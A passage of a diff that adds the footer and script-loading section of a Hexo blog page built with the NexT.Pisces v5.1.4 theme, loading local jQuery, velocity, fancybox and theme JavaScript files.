+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
